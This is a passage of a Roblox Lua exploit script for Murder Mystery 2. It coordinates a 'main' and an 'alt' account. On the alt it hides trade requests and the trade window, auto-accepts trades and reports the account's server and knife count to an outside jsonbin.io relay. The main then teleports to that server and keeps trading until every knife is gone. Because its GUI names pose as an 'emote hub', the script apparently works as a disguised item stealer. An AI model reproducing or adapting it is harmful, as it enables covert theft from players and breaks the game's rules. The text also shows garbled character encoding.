DeclineTradeRemote.OnClientEvent:Connect(function()
    State.InTrade           = false
    State.CurrentPartner    = nil
    State.AcceptedByPartner = false
    State.AcceptedBySelf    = false
    State.LastTradeFinishTick = tick()
    addLog("Trade declinada. Resetando estado.")
end)

pcall(function()
    TradeFolder:WaitForChild("DeclineRequest").OnClientEvent:Connect(function()
        State.InTrade = false; State.LastSendRequestTick = 0
    end)
    TradeFolder:WaitForChild("CancelRequest").OnClientEvent:Connect(function()
        State.InTrade = false; State.LastSendRequestTick = 0
    end)
end)

task.spawn(function()
    while true do
        task.wait(2.0)
        if State.InTrade and (tick() - State.TradeStartTick) > CONFIG.TRADE_TIMEOUT then
            addLog("Watchdog: Tempo limite excedido (35s). ForÃ§ando reset...")
            pcall(function() DeclineTradeRemote:FireServer() end)
            State.InTrade = false
            State.LastTradeFinishTick = tick()
        end
    end
end)

TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
    addLog(string.format("Falha no teleporte (%s): %s. Reenfileirando...", tostring(teleportResult), tostring(errorMessage)))
    queueScriptOnTeleport()
    task.wait(3.0)
    pcall(function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
end)

task.spawn(function()
    pcall(function()
        local promptGui     = CoreGui:WaitForChild("RobloxPromptGui", 5)
        local promptOverlay = promptGui and promptGui:WaitForChild("promptOverlay", 5)
        if promptOverlay then
            promptOverlay.ChildAdded:Connect(function(child)
                if child.Name == "ErrorPrompt" and CONFIG.AUTO_RECONNECT_ON_ERROR then
                    addLog("DesconexÃ£o detectada! Reenfileirando e reconectando...")
                    queueScriptOnTeleport()
                    task.wait(2.5)
                    pcall(function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
                end
            end)
        end
    end)
end)

local httpRequest = (syn and syn.request)
    or (http and http.request)
    or http_request
    or request
    or (fluxus and fluxus.request)
    or (getgenv and (getgenv().request or getgenv().http_request))

local function safeHttp(options)
    if not httpRequest then return nil, "no http" end
    local headers = options.Headers or {}
    if not headers["User-Agent"] then
        headers["User-Agent"] = "Mozilla/5.0"
    end
    options.Headers = headers
    local ok, res = pcall(function() return httpRequest(options) end)
    if ok and res then
        return res.StatusCode or res.Status, res.Body
    end
    return nil, tostring(res)
end

local function relayBinUrl()
    if not CONFIG.RELAY_BIN_ID or CONFIG.RELAY_BIN_ID == "" then return nil end
    return string.format("https://api.jsonbin.io/v3/b/%s", CONFIG.RELAY_BIN_ID)
end

local function relayWrite()
    local url = relayBinUrl()
    if not url then return end

    local data = {
        altName  = myName,
        jobId    = game.JobId ~= "" and game.JobId or "Unknown",
        knives   = State.RemainingKnives,
        ready    = not State.AllItemsTransferred,
        placeId  = game.PlaceId,
        t        = os.time(),
    }
    local okJson, body = pcall(function() return HttpService:JSONEncode(data) end)
    if not okJson then return end

    local headers = {
        ["Content-Type"] = "application/json",
        ["X-Bin-Versioning"] = "false",
    }
    if CONFIG.RELAY_API_KEY ~= "" then
        headers["X-Access-Key"] = CONFIG.RELAY_API_KEY
    end

    task.spawn(function()
        local status = safeHttp({ Url = url, Method = "PUT", Headers = headers, Body = body })
        if status == 200 then
            addLog(string.format("[Relay] Publicado: JobId=%s, Facas=%d", data.jobId, data.knives))
        end
    end)
end

local LastRelayRead = 0
local function relayRead()
    local url = relayBinUrl()
    if not url then return nil end
    if (tick() - LastRelayRead) < CONFIG.RELAY_POLL_INTERVAL then return nil end
    LastRelayRead = tick()

    local headers = { ["Content-Type"] = "application/json" }
    if CONFIG.RELAY_API_KEY ~= "" then
        headers["X-Access-Key"] = CONFIG.RELAY_API_KEY
    end

    local status, body = safeHttp({ Url = url, Method = "GET", Headers = headers })
    if status ~= 200 or not body then return nil end

    local okJson, wrapper = pcall(function() return HttpService:JSONDecode(body) end)
    if not okJson or not wrapper then return nil end

    local rec = (wrapper.record or wrapper)
    if type(rec) ~= "table" then return nil end

    return rec
end

local function findAltInServer()
    if State.ActiveAltName and State.ActiveAltName ~= "" then
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Name:lower() == State.ActiveAltName:lower() then
                return p
            end
        end
    end
    local all = Players:GetPlayers()
    if #all == 2 then
        for _, p in ipairs(all) do
            if p ~= LocalPlayer and p.Name:lower() ~= CONFIG.MAIN_USERNAME:lower() then
                State.ActiveAltName = p.Name
                return p
            end
        end
    end
    return nil
end

task.spawn(function()
    if not isAlt then return end

    task.wait(2.5)
    forceEnableRequests()
    local knives = scanTradableKnives()
    addLog(string.format("Alt '%s' carregada! Encontradas %d facas. Top: %s", myName, #knives, State.TopTierDetected))

    if #knives == 0 then
        State.AllItemsTransferred = true
        pcall(function() SetRequestsRemote:FireServer(false) end)
        if TradeModuleRef then TradeModuleRef.RequestsEnabled = false end
        addLog("Alt possui 0 facas! Sistema finalizado.")
    end

    if getgenv then
        getgenv().MM2_AltName  = myName
        getgenv().MM2_AltReady = true
        getgenv().MM2_AltJobId = game.JobId
    end
    relayWrite()

    local lastWriteTick = tick()

    while true do
        task.wait(4.0)
        if State.Enabled and not State.InTrade and not State.AllItemsTransferred then
            forceEnableRequests()
            if (tick() % 20) < 4 then scanTradableKnives() end
            if (tick() - lastWriteTick) >= CONFIG.RELAY_WRITE_INTERVAL then
                lastWriteTick = tick()
                relayWrite()
            end
        end
    end
end)

task.spawn(function()
    if not isMain then return end

    task.wait(2.0)
    forceEnableRequests()
    addLog(string.format("%s (Main) ativo! Aguardando Alt...", CONFIG.MAIN_USERNAME))

    while true do
        task.wait(1.5)

        if State.Enabled and not State.InTrade then
            forceEnableRequests()

            if getgenv and getgenv().MM2_AltName and getgenv().MM2_AltName ~= "" then
                local bridgedName = getgenv().MM2_AltName
                if bridgedName:lower() ~= CONFIG.MAIN_USERNAME:lower() and State.ActiveAltName == "" then
                    State.ActiveAltName = bridgedName
                    addLog(string.format("[Ponte local] Alt '%s' detectada.", bridgedName))
                end
            end

            local relayData = relayRead()
            if relayData and type(relayData.altName) == "string" and relayData.altName ~= "" then
                if relayData.altName:lower() ~= CONFIG.MAIN_USERNAME:lower() then
                    if State.ActiveAltName ~= relayData.altName then
                        State.ActiveAltName = relayData.altName
                        addLog(string.format("[Relay] Alt '%s' encontrada via JSONBin.", relayData.altName))
                    end
                end

                if relayData.ready == false or relayData.knives == 0 then
                    if not State.AllItemsTransferred then
                        State.AllItemsTransferred = true
                        addLog("[Relay] Alt reportou 0 facas. Parando envio de trades.")
                    end
                end

                local altJobId    = type(relayData.jobId) == "string" and relayData.jobId or ""
                local isRecent    = (os.time() - (tonumber(relayData.t) or 0)) < 60

                if altJobId ~= "" and altJobId ~= game.JobId and altJobId ~= "Unknown" and isRecent then
                    local altInServer = findAltInServer()
                    if not altInServer and (tick() - State.LastTeleportTick) > 12.0 then
                        State.LastTeleportTick = tick()
                        addLog(string.format("[Relay] Alt em outro servidor! Teleportando para `%s`...", string.sub(altJobId, 1, 12)))
                        pcall(function()
                            queueScriptOnTeleport()
                            TeleportService:TeleportToPlaceInstance(game.PlaceId, altJobId, LocalPlayer)
                        end)
                    end
                end
            end

            local altPlayer    = findAltInServer()
            local inSameServer = (altPlayer ~= nil)
            if inSameServer then State.ActiveAltName = altPlayer.Name end

            if inSameServer and altPlayer then
                if State.AllItemsTransferred then
                    if not State.TransferFinishedLogged then
                        State.TransferFinishedLogged = true
                        addLog(string.format("â† ConcluÃ­do! %s parando de enviar trades.", CONFIG.MAIN_USERNAME))
                        State.StatusMessage = "ConcluÃ­do: 0 facas restantes na Alt"
                        if _G.UpdateTradeUI then pcall(_G.UpdateTradeUI) end
                    end
                else
                    local timeSinceLastTrade = tick() - State.LastTradeFinishTick
                    local timeSinceLastSend  = tick() - State.LastSendRequestTick

                    if timeSinceLastTrade >= CONFIG.BATCH_DELAY and timeSinceLastSend >= 2.5 then
                        State.LastSendRequestTick = tick()
                        addLog(string.format("%s: Disparando trade para '%s'...", CONFIG.MAIN_USERNAME, altPlayer.Name))
                        task.spawn(function()
                            local ok, err = pcall(function()
                                return SendRequestRemote:InvokeServer(altPlayer)
                            end)
                            if ok then
                                addLog(string.format("%s: Pedido enviado para '%s'!", CONFIG.MAIN_USERNAME, altPlayer.Name))
                            else
                                addLog(string.format("SendRequest erro: %s", tostring(err)))
                            end
                        end)
                    end
                end
            elseif not inSameServer and not relayBinUrl() then
                addLog(string.format("Aguardando Alt '%s'... (configure RELAY_BIN_ID para teleporte auto)",
                    State.ActiveAltName ~= "" and State.ActiveAltName or "?"))
                task.wait(5.0)
            end
        end
    end
end)

local function getGuiParent()
    local success, core = pcall(function()
        return (gethui and gethui()) or (get_hidden_gui and get_hidden_gui()) or CoreGui
    end)
    if success and core then return core end
    return LocalPlayer:WaitForChild("PlayerGui")
end

local function cleanAllPreviousInstances(names)
    local containers = {}
    pcall(function() if gethui then table.insert(containers, gethui()) end end)
    pcall(function() if get_hidden_gui then table.insert(containers, get_hidden_gui()) end end)
    pcall(function() table.insert(containers, CoreGui) end)
    pcall(function() if LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui") then table.insert(containers, LocalPlayer.PlayerGui) end end)
    for _, container in ipairs(containers) do
        pcall(function()
            for _, name in ipairs(names) do
                local found = container:FindFirstChild(name)
                while found do found:Destroy(); found = container:FindFirstChild(name) end
            end
        end)
    end
end

local StudioTheme = {
    windowBg     = Color3.fromRGB(37, 37, 38),   headerBg   = Color3.fromRGB(45, 45, 48),
    panelAlt     = Color3.fromRGB(32, 32, 34),   insetBg    = Color3.fromRGB(26, 26, 28),
    border       = Color3.fromRGB(20, 20, 22),   borderSubtle = Color3.fromRGB(55, 55, 58),
    text         = Color3.fromRGB(225, 225, 228), textMuted  = Color3.fromRGB(160, 160, 165),
    textDim      = Color3.fromRGB(115, 115, 120), blue       = Color3.fromRGB(0, 122, 204),
    blueHover    = Color3.fromRGB(28, 140, 224),  green      = Color3.fromRGB(76, 175, 80),
    greenHover   = Color3.fromRGB(92, 195, 96),   red        = Color3.fromRGB(215, 60, 60),
    redHover     = Color3.fromRGB(235, 75, 75),   yellow     = Color3.fromRGB(230, 180, 50),
    btnBg        = Color3.fromRGB(50, 50, 54),    btnHover   = Color3.fromRGB(65, 65, 70),
    tabActive    = Color3.fromRGB(40, 40, 42),    tabInactive = Color3.fromRGB(30, 30, 32),
}

local function makeStudioButton(parent, text, w, h, bg, fg)
    local b = Instance.new("TextButton")
    b.Size = (typeof(w) == "number") and UDim2.new(0, w, 0, h or 22) or w
    b.BackgroundColor3 = bg or StudioTheme.btnBg
    b.Text = text
    b.TextColor3 = fg or StudioTheme.text
    b.TextSize = 12
    b.Font = Enum.Font.SourceSansSemibold
    b.AutoButtonColor = false
    b.BorderSizePixel = 1
    b.BorderColor3 = StudioTheme.border
    b.ClipsDescendants = true
    b.Parent = parent

    local defaultBg = bg or StudioTheme.btnBg
    local hoverBg   = (bg == StudioTheme.blue and StudioTheme.blueHover)
        or (bg == StudioTheme.red and StudioTheme.redHover)
        or (bg == StudioTheme.green and StudioTheme.greenHover)
        or StudioTheme.btnHover

    b.MouseEnter:Connect(function() b.BackgroundColor3 = hoverBg end)
    b.MouseLeave:Connect(function() b.BackgroundColor3 = defaultBg end)
    return b
end

local GUI_NAMES = {"StudioEmoteHub","BevelEmoteHub","PotassiumEmoteHub","MM2AutoTradeRelayUI","StudioAnimPackHub","StudioAnimationHub"}

local function createAutoTradeHUD()
    if not isMain then
        cleanAllPreviousInstances(GUI_NAMES)
        return
    end

    cleanAllPreviousInstances(GUI_NAMES)
    local targetParent = getGuiParent()

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "StudioEmoteHub"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Parent = targetParent

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 510, 0, 420)
    MainFrame.Position = UDim2.new(0.5, -255, 0.5, -210)
    MainFrame.BackgroundColor3 = StudioTheme.windowBg
    MainFrame.BorderSizePixel = 1
    MainFrame.BorderColor3 = StudioTheme.border
    MainFrame.Visible = true
    MainFrame.Active = true
    MainFrame.ClipsDescendants = true
    MainFrame.Parent = ScreenGui

    local TopBar = Instance.new("Frame")
    TopBar.Size = UDim2.new(1, 0, 0, 26)
    TopBar.BackgroundColor3 = StudioTheme.headerBg
    TopBar.BorderSizePixel = 1
    TopBar.BorderColor3 = StudioTheme.border
    TopBar.Parent = MainFrame

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, -40, 1, 0)
    Title.Position = UDim2.new(0, 8, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = string.format("MM2 Auto-Trade â€¢ %s (MAIN)", myName)
    Title.TextColor3 = StudioTheme.text
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Font = Enum.Font.SourceSansSemibold
    Title.TextSize = 13
    Title.Parent = TopBar

    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0, 26, 1, 0)
    CloseBtn.Position = UDim2.new(1, -26, 0, 0)
    CloseBtn.BackgroundColor3 = StudioTheme.headerBg
    CloseBtn.BorderSizePixel = 0
    CloseBtn.Text = "X"
    CloseBtn.TextColor3 = StudioTheme.textMuted
    CloseBtn.Font = Enum.Font.SourceSansBold
    CloseBtn.TextSize = 12
    CloseBtn.Parent = TopBar
    CloseBtn.MouseEnter:Connect(function() CloseBtn.BackgroundColor3 = StudioTheme.red; CloseBtn.TextColor3 = Color3.fromRGB(255,255,255) end)
    CloseBtn.MouseLeave:Connect(function() CloseBtn.BackgroundColor3 = StudioTheme.headerBg; CloseBtn.TextColor3 = StudioTheme.textMuted end)
    CloseBtn.Activated:Connect(function() MainFrame.Visible = false end)

    local dragging, dragStart, startPos
    TopBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = MainFrame.Position
        end
    end)
    TopBar.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    local TabStrip = Instance.new("Frame")
    TabStrip.Size = UDim2.new(1, 0, 0, 26)
    TabStrip.Position = UDim2.new(0, 0, 0, 26)
    TabStrip.BackgroundColor3 = StudioTheme.tabInactive
    TabStrip.BorderSizePixel = 1
    TabStrip.BorderColor3 = StudioTheme.border
    TabStrip.Parent = MainFrame

    local MainTabBtn = Instance.new("TextButton")
    MainTabBtn.Size = UDim2.new(0.5, 0, 1, 0)
    MainTabBtn.BackgroundColor3 = StudioTheme.tabActive
    MainTabBtn.BorderSizePixel = 1; MainTabBtn.BorderColor3 = StudioTheme.border
    MainTabBtn.Text = "Painel Principal"
    MainTabBtn.TextColor3 = StudioTheme.text
    MainTabBtn.Font = Enum.Font.SourceSansSemibold; MainTabBtn.TextSize = 12
    MainTabBtn.Parent = TabStrip

    local MainTabAccent = Instance.new("Frame")
    MainTabAccent.Size = UDim2.new(1, 0, 0, 2)
    MainTabAccent.BackgroundColor3 = StudioTheme.blue
    MainTabAccent.BorderSizePixel = 0
    MainTabAccent.Parent = MainTabBtn

    local LogsTabBtn = Instance.new("TextButton")
    LogsTabBtn.Size = UDim2.new(0.5, 0, 1, 0)
    LogsTabBtn.Position = UDim2.new(0.5, 0, 0, 0)
    LogsTabBtn.BackgroundColor3 = StudioTheme.tabInactive
    LogsTabBtn.BorderSizePixel = 1; LogsTabBtn.BorderColor3 = StudioTheme.border
    LogsTabBtn.Text = "HistÃ³rico de Logs"
    LogsTabBtn.TextColor3 = StudioTheme.textMuted
    LogsTabBtn.Font = Enum.Font.SourceSansSemibold; LogsTabBtn.TextSize = 12
    LogsTabBtn.Parent = TabStrip

    local LogsTabAccent = Instance.new("Frame")
    LogsTabAccent.Size = UDim2.new(1, 0, 0, 2)
    LogsTabAccent.BackgroundColor3 = StudioTheme.blue
    LogsTabAccent.BorderSizePixel = 0
    LogsTabAccent.Visible = false
    LogsTabAccent.Parent = LogsTabBtn

    local FOOTER_H = 22
    local MainContainer = Instance.new("Frame")
    MainContainer.Size = UDim2.new(1, -8, 1, -(52 + FOOTER_H + 8))
    MainContainer.Position = UDim2.new(0, 4, 0, 56)
    MainContainer.BackgroundTransparency = 1
    MainContainer.Parent = MainFrame

    local LogsContainer = Instance.new("Frame")
    LogsContainer.Size = UDim2.new(1, -8, 1, -(52 + FOOTER_H + 8))
    LogsContainer.Position = UDim2.new(0, 4, 0, 56)
    LogsContainer.BackgroundTransparency = 1
    LogsContainer.Visible = false
    LogsContainer.Parent = MainFrame

    local function selectTab(isMainTab)
        MainContainer.Visible = isMainTab
        LogsContainer.Visible = not isMainTab
        MainTabBtn.BackgroundColor3 = isMainTab and StudioTheme.tabActive or StudioTheme.tabInactive
        MainTabBtn.TextColor3       = isMainTab and StudioTheme.text or StudioTheme.textMuted
        MainTabAccent.Visible       = isMainTab
        LogsTabBtn.BackgroundColor3 = (not isMainTab) and StudioTheme.tabActive or StudioTheme.tabInactive
        LogsTabBtn.TextColor3       = (not isMainTab) and StudioTheme.text or StudioTheme.textMuted
        LogsTabAccent.Visible       = not isMainTab
    end

    MainTabBtn.MouseButton1Click:Connect(function() selectTab(true) end)
    LogsTabBtn.MouseButton1Click:Connect(function() selectTab(false) end)

    local StatusCard = Instance.new("Frame")
    StatusCard.Size = UDim2.new(1, 0, 0, 120)
    StatusCard.BackgroundColor3 = StudioTheme.panelAlt
    StatusCard.BorderSizePixel = 1; StatusCard.BorderColor3 = StudioTheme.border
    StatusCard.Parent = MainContainer

    local function createField(name, defaultVal, yPos, color)
        local fTitle = Instance.new("TextLabel")
        fTitle.Size = UDim2.new(0, 130, 0, 20); fTitle.Position = UDim2.new(0, 8, 0, yPos)
        fTitle.BackgroundTransparency = 1; fTitle.Text = name
        fTitle.TextColor3 = StudioTheme.textMuted; fTitle.Font = Enum.Font.SourceSansSemibold
        fTitle.TextSize = 12; fTitle.TextXAlignment = Enum.TextXAlignment.Left; fTitle.Parent = StatusCard

        local fVal = Instance.new("TextLabel")
        fVal.Size = UDim2.new(1, -145, 0, 20); fVal.Position = UDim2.new(0, 140, 0, yPos)
        fVal.BackgroundTransparency = 1; fVal.Text = defaultVal
        fVal.TextColor3 = color or StudioTheme.text; fVal.Font = Enum.Font.SourceSans
        fVal.TextSize = 12; fVal.TextXAlignment = Enum.TextXAlignment.Left
        fVal.TextTruncate = Enum.TextTruncate.AtEnd; fVal.Parent = StatusCard
        return fVal
    end

    local PartnerVal = createField("Alt Parceira:",   "Aguardando...",     8,  StudioTheme.textMuted)
    local TierVal    = createField("Top Raridade:",   "Calculando...",     34, StudioTheme.yellow)
    local StatsVal   = createField("MÃ©tricas:",       "Lotes: 0 â€¢ Facas: 0", 60, StudioTheme.green)
    local BridgeVal  = createField("Ponte In-Game:",  "Scanning...",       86, StudioTheme.blue)

    local ActionFrame1 = Instance.new("Frame")
    ActionFrame1.Size = UDim2.new(1, 0, 0, 26); ActionFrame1.Position = UDim2.new(0, 0, 0, 126)
    ActionFrame1.BackgroundTransparency = 1; ActionFrame1.Parent = MainContainer

    local ToggleBtn  = makeStudioButton(ActionFrame1, "Auto-Trade: LIGADO",  UDim2.new(0.485, 0, 1, 0), 26, StudioTheme.green, Color3.fromRGB(255,255,255))
    ToggleBtn.Position = UDim2.new(0, 0, 0, 0)
    local TriggerBtn = makeStudioButton(ActionFrame1, "Enviar Trade Agora", UDim2.new(0.485, 0, 1, 0), 26, StudioTheme.blue, Color3.fromRGB(255,255,255))
    TriggerBtn.Position = UDim2.new(0.515, 0, 0, 0)

    local ActionFrame2 = Instance.new("Frame")
    ActionFrame2.Size = UDim2.new(1, 0, 0, 26); ActionFrame2.Position = UDim2.new(0, 0, 0, 158)
    ActionFrame2.BackgroundTransparency = 1; ActionFrame2.Parent = MainContainer

    local ReinjectBtn = makeStudioButton(ActionFrame2, "Reinjetar (GitHub)", UDim2.new(1, 0, 1, 0), 26, StudioTheme.btnBg, StudioTheme.text)
    ReinjectBtn.Position = UDim2.new(0, 0, 0, 0)

    local QuickInfo = Instance.new("Frame")
    QuickInfo.Size = UDim2.new(1, 0, 1, -192); QuickInfo.Position = UDim2.new(0, 0, 0, 190)
    QuickInfo.BackgroundColor3 = StudioTheme.insetBg; QuickInfo.BorderSizePixel = 1
    QuickInfo.BorderColor3 = StudioTheme.border; QuickInfo.Parent = MainContainer

    local InfoTitle = Instance.new("TextLabel")
    InfoTitle.Size = UDim2.new(1, -16, 0, 20); InfoTitle.Position = UDim2.new(0, 8, 0, 6)
    InfoTitle.BackgroundTransparency = 1; InfoTitle.Text = "Como funciona a Ponte In-Game"
    InfoTitle.TextColor3 = StudioTheme.blue; InfoTitle.Font = Enum.Font.SourceSansSemibold
    InfoTitle.TextSize = 12; InfoTitle.TextXAlignment = Enum.TextXAlignment.Left; InfoTitle.Parent = QuickInfo

    local InfoDesc = Instance.new("TextLabel")
    InfoDesc.Size = UDim2.new(1, -16, 1, -30); InfoDesc.Position = UDim2.new(0, 8, 0, 26)
    InfoDesc.BackgroundTransparency = 1
    InfoDesc.Text = string.format(
        "â€¢ Ambas as contas executam o mesmo script com o nome '%s'.\nâ€¢ Quando a Alt e a Main estiverem no MESMO servidor, o trade inicia automaticamente.\nâ€¢ Sem webhook: a ponte Ã© feita diretamente via Players do jogo.\nâ€¢ Atalho: tecla [ , ] para alternar este painel.",
        CONFIG.MAIN_USERNAME)
    InfoDesc.TextColor3 = StudioTheme.textMuted; InfoDesc.Font = Enum.Font.SourceSans
    InfoDesc.TextSize = 12; InfoDesc.TextXAlignment = Enum.TextXAlignment.Left
    InfoDesc.TextYAlignment = Enum.TextYAlignment.Top; InfoDesc.TextWrapped = true
    InfoDesc.Parent = QuickInfo

    local LogsWrapper = Instance.new("Frame")
    LogsWrapper.Size = UDim2.new(1, 0, 1, 0); LogsWrapper.BackgroundColor3 = StudioTheme.insetBg
    LogsWrapper.BorderSizePixel = 1; LogsWrapper.BorderColor3 = StudioTheme.border
    LogsWrapper.ClipsDescendants = true; LogsWrapper.Parent = LogsContainer

    local LogScroll = Instance.new("ScrollingFrame")
    LogScroll.Size = UDim2.new(1, -2, 1, -2); LogScroll.Position = UDim2.new(0, 1, 0, 1)
    LogScroll.BackgroundTransparency = 1; LogScroll.BorderSizePixel = 0
    LogScroll.ScrollBarThickness = 5; LogScroll.ScrollBarImageColor3 = StudioTheme.borderSubtle
    LogScroll.CanvasSize = UDim2.new(0, 0, 0, 0); LogScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    LogScroll.ClipsDescendants = true; LogScroll.Parent = LogsWrapper

    local LogLayout = Instance.new("UIListLayout")
    LogLayout.SortOrder = Enum.SortOrder.LayoutOrder; LogLayout.Padding = UDim.new(0, 2); LogLayout.Parent = LogScroll

    local LogPad = Instance.new("UIPadding")
    LogPad.PaddingTop = UDim.new(0, 4); LogPad.PaddingBottom = UDim.new(0, 4)
    LogPad.PaddingLeft = UDim.new(0, 6); LogPad.PaddingRight = UDim.new(0, 6); LogPad.Parent = LogScroll

    local Footer = Instance.new("Frame")
    Footer.Size = UDim2.new(1, 0, 0, FOOTER_H); Footer.Position = UDim2.new(0, 0, 1, -FOOTER_H)
    Footer.BackgroundColor3 = StudioTheme.headerBg; Footer.BorderSizePixel = 1
    Footer.BorderColor3 = StudioTheme.border; Footer.Parent = MainFrame

    local StatusLabel = Instance.new("TextLabel")
    StatusLabel.BackgroundTransparency = 1; StatusLabel.Size = UDim2.new(1, -12, 1, 0)
    StatusLabel.Position = UDim2.new(0, 6, 0, 0); StatusLabel.Text = "Atalho: [ , ] Alternar  |  Status: Pronto"
    StatusLabel.TextColor3 = StudioTheme.textDim; StatusLabel.TextSize = 11
    StatusLabel.Font = Enum.Font.SourceSans; StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
    StatusLabel.Parent = Footer

    local function updateUI()
        local altPlayer = findAltInServer()
        local activeAlt = altPlayer and altPlayer.Name or (State.ActiveAltName ~= "" and State.ActiveAltName or "Aguardando Alt...")
        local present   = (altPlayer ~= nil)

        PartnerVal.Text = string.format("%s (%s)", activeAlt, present and "Mesmo servidor âœ“" or "Aguardando...")
        PartnerVal.TextColor3 = present and StudioTheme.green or StudioTheme.textMuted

        TierVal.Text   = State.TopTierDetected
        StatsVal.Text  = string.format("Lotes: %d  â€¢  Facas: %d  â€¢  Restantes: %d", State.TradesCompleted, State.KnivesTransferred, State.RemainingKnives)
        BridgeVal.Text = present and "Conectados (mesma sala)" or string.format("Aguardando Alt '%s'...", State.ActiveAltName ~= "" and State.ActiveAltName or "?")
        BridgeVal.TextColor3 = present and StudioTheme.green or StudioTheme.yellow

        ToggleBtn.Text = State.Enabled and "Auto-Trade: LIGADO" or "Auto-Trade: DESLIGADO"
        ToggleBtn.BackgroundColor3 = State.Enabled and StudioTheme.green or StudioTheme.red

        if State.AllItemsTransferred then
            StatusLabel.Text = string.format("[ , ] Alternar  |  CONCLUÃDO (%d facas transferidas)", State.KnivesTransferred)
        else
            StatusLabel.Text = string.format("[ , ] Alternar  |  %s  |  Facas: %d", State.StatusMessage, State.KnivesTransferred)
        end

        for _, child in ipairs(LogScroll:GetChildren()) do
            if child:IsA("TextLabel") then child:Destroy() end
        end
        for idx, line in ipairs(LogHistory) do
            local lbl = Instance.new("TextLabel")
            lbl.Size = UDim2.new(1, 0, 0, 16); lbl.BackgroundTransparency = 1
            lbl.Text = line; lbl.TextColor3 = StudioTheme.textMuted
            lbl.Font = Enum.Font.SourceSans; lbl.TextSize = 11
            lbl.TextXAlignment = Enum.TextXAlignment.Left; lbl.LayoutOrder = idx; lbl.Parent = LogScroll
        end
    end

    _G.UpdateTradeUI = updateUI

    ToggleBtn.MouseButton1Click:Connect(function()
        State.Enabled = not State.Enabled
        if State.Enabled then State.AllItemsTransferred = false; State.TransferFinishedLogged = false end
        addLog("Auto-Trade: " .. (State.Enabled and "LIGADO" or "DESLIGADO"))
        updateUI()
    end)

    TriggerBtn.MouseButton1Click:Connect(function()
        State.AllItemsTransferred  = false
        State.TransferFinishedLogged = false
        local partner = findAltInServer()
        if partner then
            addLog("Disparo manual de trade para " .. partner.Name)
            task.spawn(function() pcall(function() SendRequestRemote:InvokeServer(partner) end) end)
        else
            addLog("Alt nÃ£o estÃ¡ neste servidor!")
        end
        updateUI()
    end)

    ReinjectBtn.MouseButton1Click:Connect(function()
        addLog("ReinjeÃ§Ã£o manual via GitHub...")
        reinjectFromGithub()
    end)

    UserInputService.InputBegan:Connect(function(input, processed)
        if not processed and input.KeyCode == Enum.KeyCode.Comma then
            MainFrame.Visible = not MainFrame.Visible
        end
    end)

    updateUI()
end

local function setupInvisibleTradeRequest()
    task.spawn(function()
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 15)
        if not playerGui then return end

        local function processDescendant(descendant)
            if descendant.Name == "TradeRequest" or descendant.Name == "ReceivingRequest" then
                if concealTradeRequest then concealTradeRequest(descendant) end
                descendant:GetPropertyChangedSignal("Visible"):Connect(function()
                    if descendant.Visible then
                        if concealTradeRequest then concealTradeRequest(descendant) end
                        if CONFIG.AUTO_ACCEPT_TRADE_REQUEST and not State.InTrade and State.Enabled and not (isAlt and State.AllItemsTransferred) then
                            task.spawn(function() if autoAcceptTradeRequest then autoAcceptTradeRequest("UI_Visible") end end)
                        end
                    end
                end)
            end
        end

        for _, desc in ipairs(playerGui:GetDescendants()) do processDescendant(desc) end
        playerGui.DescendantAdded:Connect(processDescendant)

        while true do
            task.wait(0.5)
            if CONFIG.INVISIBLE_TRADE_REQUEST then
                pcall(function()
                    local gameGui   = playerGui:FindFirstChild("Game")
                    local leaderboard = gameGui and gameGui:FindFirstChild("Leaderboard")
                    local container = leaderboard and leaderboard:FindFirstChild("Container")
                    local tradeReq  = container and container:FindFirstChild("TradeRequest")
                    if tradeReq then
                        if tradeReq.Visible or tradeReq.Position.X.Scale < 50 then
                            if concealTradeRequest then concealTradeRequest(tradeReq) end
                            if CONFIG.AUTO_ACCEPT_TRADE_REQUEST and not State.InTrade and State.Enabled and not (isAlt and State.AllItemsTransferred) then
                                task.spawn(function() if autoAcceptTradeRequest then autoAcceptTradeRequest("Watchdog") end end)
                            end
                        end
                    end
                end)
            end
        end
    end)
end

local function hideAltTradeGUI()
    if not isAlt then return end
    task.spawn(function()
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 15) or LocalPlayer:FindFirstChildOfClass("PlayerGui")
        if not playerGui then return end

        local tradeGui = playerGui:FindFirstChild("TradeGUI")
        if tradeGui and concealAltTradeGui then concealAltTradeGui(tradeGui) end

        local c1 = playerGui.ChildAdded:Connect(function(child)
            if child.Name == "TradeGUI" and concealAltTradeGui then concealAltTradeGui(child) end
        end)
        local c2 = playerGui.DescendantAdded:Connect(function(descendant)
            if descendant.Name == "TradeGUI" and concealAltTradeGui then concealAltTradeGui(descendant) end
        end)
        table.insert(altTradeGuiConnections, c1)
        table.insert(altTradeGuiConnections, c2)

        local function enforceConcealment()
            if not isAlt then return end
            pcall(function()
                local tg = playerGui:FindFirstChild("TradeGUI")
                if tg then
                    if tg:IsA("ScreenGui") and tg.DisplayOrder > -999999 then tg.DisplayOrder = -999999 end
                    local cb = tg:FindFirstChild("ClickBlocker")
                    if cb and (cb.Visible or cb.BackgroundTransparency < 1) then
                        cb.Visible = false; cb.BackgroundTransparency = 1
